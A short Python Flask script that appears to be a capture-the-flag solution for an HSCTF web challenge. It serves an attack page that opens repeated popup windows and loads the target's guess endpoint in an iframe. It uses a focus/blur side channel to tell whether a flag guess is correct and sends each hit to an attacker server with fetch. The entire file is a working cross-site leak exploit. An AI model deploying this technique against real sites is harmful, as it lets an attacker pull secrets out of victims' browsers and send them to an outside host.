from flask import Flask, request

app = Flask(__name__)

my_server = ""

@app.route("/<flag>")
def leak(flag):
    w_open = ""
    if request.args.get("open") is None:
        w_open = f"window.open('/{flag}?open');"
    return f"""
<html>
<body>
<a id="satoki" href="http://example.com" onblur="fetch('{my_server}?s={flag}')">satoki</a>
<script>
{w_open * 10}
document.getElementById("satoki").focus();
var ifr = document.createElement("iframe");
ifr.src = "http://web1.hsctf.com:8001/guess?guess={flag}#continue";
document.body.appendChild(ifr);
</script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=80)